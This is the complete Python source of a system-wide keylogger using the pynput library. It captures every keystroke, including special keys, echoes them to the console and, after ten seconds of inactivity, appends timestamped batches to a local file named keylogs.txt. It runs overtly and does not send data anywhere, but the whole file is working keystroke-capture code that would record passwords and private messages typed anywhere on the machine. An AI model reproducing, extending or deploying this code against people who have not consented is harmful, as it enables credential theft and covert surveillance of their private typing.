from pynput import keyboard
from datetime import datetime
import time
import threading

# config
COUNTDOWN_DURATION = 10 # relatively arbitrary duration but represents the time before key collection stops for that batch of inputs
LOG_FILE_PATH = "keylogs.txt" # temp local file

# globals
collected_keys = [] # list to store the accumulated key logs
countdown_active = False # flag to indicate if the countdown thread is running
initial_log_time = None # current batch start timestamp
last_keypress_time = None # last input timestamp (initialized to None, will be set on first keypress)


# record each key press and determine the time
def on_press(key):
    global last_keypress_time, countdown_active, initial_log_time

    # Initialize initial_log_time if this is the first key in a new batch
    if initial_log_time is None:
        initial_log_time = datetime.now()

    try:
        char = key.char
        print(char, end='', flush=True) 
        collected_keys.append(char) # add the recorded character to the list

    except AttributeError:
        # handle special keys i.e. Space, Enter, Shift, Ctrl, Alt
        if key == keyboard.Key.space:
            special_key_repr = "[SPACE]"
        elif key == keyboard.Key.enter:
            special_key_repr = "[ENTER]\n" # add newline for readability
        elif key == keyboard.Key.tab:
            special_key_repr = "[TAB]\t"
        elif key == keyboard.Key.backspace:
            special_key_repr = "[BACKSPACE]"
        else:
            # for other misc special keys (e.g., Key.shift, Key.ctrl_l, Key.alt_gr)
            special_key_repr = f"[{str(key).replace('Key.', '').upper()}]"
        
        print(special_key_repr, end='', flush=True)
        collected_keys.append(special_key_repr) # add the recorded special character to the list
    
    # update the time of the last key press
    last_keypress_time = time.time()
    
    # start the countdown thread only if it's not already active and after the first keypress has set last_keypress_time.
    if not countdown_active:
        countdown_active = True
        threading.Thread(target=start_countdown, daemon=True).start() # daemon=True allows the thread to exit when the main program exits


# start a countdown thread that will dump the collected keys after a certain period of inactivity
def start_countdown():
    global countdown_active, last_keypress_time # Ensure last_keypress_time is global here

    # loop while countdown is active AND there's still inactivity
    # last_keypress_time will be a float by the time this loop runs due to fix in on_press
    while countdown_active and (time.time() - last_keypress_time) < COUNTDOWN_DURATION:
        time.sleep(1) # Check every second
    
    # if the loop finished because the countdown expired (i.e., no keypress for COUNTDOWN_DURATION)
    if countdown_active: 
        countdown_active = False # reset flag for the next batch
        print(f"\n{COUNTDOWN_DURATION} seconds expired, dumping data...")
        dump_data_batch()

# dump the collected keys to a file
def dump_data_batch():
    global collected_keys, initial_log_time, countdown_active # countdown_active is already False here

    if not collected_keys:
        print("No data to dump in this batch.")
        return # No data to dump

    current_log_time = datetime.now()

    log_duration_seconds = (current_log_time - initial_log_time).total_seconds() if initial_log_time else 0 # find the elapsed duration since the initial log time
    log_content = "".join(collected_keys)

    # prepare the log entry string
    log_entry = f"----- Log Batch Start (UTC: {initial_log_time.isoformat()}Z, Duration: {log_duration_seconds:.2f}s) -----\n" \
                f"Logged Content:\n{log_content}\n" \
                f"----- Log Batch End (UTC: {current_log_time.isoformat()}Z) -----\n\n"

    try:
        with open(LOG_FILE_PATH, "a", encoding="utf-8") as f:
            f.write(log_entry)
        print(f"Data successfully dumped to {LOG_FILE_PATH}")
    except IOError as e:
        print(f"Error dumping data to file: {e}")
    finally:
        # reset state for the next cycle
        collected_keys.clear()
        initial_log_time = None


# main listens for key inputs, records them and dumps them to a file after a certain period of inactivity
if __name__ == "__main__":
    print("--- Keylogger Started ---")
    print(f"Monitoring system-wide key inputs. Data will dump after {COUNTDOWN_DURATION}s of inactivity.")
    print("Press Ctrl+C to stop.")
    print("-------------------------")

    listener = keyboard.Listener(on_press=on_press)
    # The countdown thread is now explicitly started inside on_press,
    # so we don't start it here in main.

    listener.start() # Start the pynput listener thread

    try:
        # keep the main tread alive, this will be interrupted by Ctrl+C
        # a simple infinite loop or long sleep works
        while listener.running:
            time.sleep(1) # sleep for 1 second and check listener status again
        
    except KeyboardInterrupt:
        print("\n-------------------------")
        print("Keylogger Stopped by User (Ctrl+C).")
        
        # dump any remaining collected keys before exiting
        if collected_keys:
            print("Dumping final batch of collected keys...")
            dump_data_batch() # call dump_data_batch for any remaining data
        
        print("-------------------------")
    finally:
        # ensure the listener thread is stopped when the main thread exits
        listener.stop() 
        listener.join() # wait for the listener thread to finish cleanly
        print("Keylogger process ended.")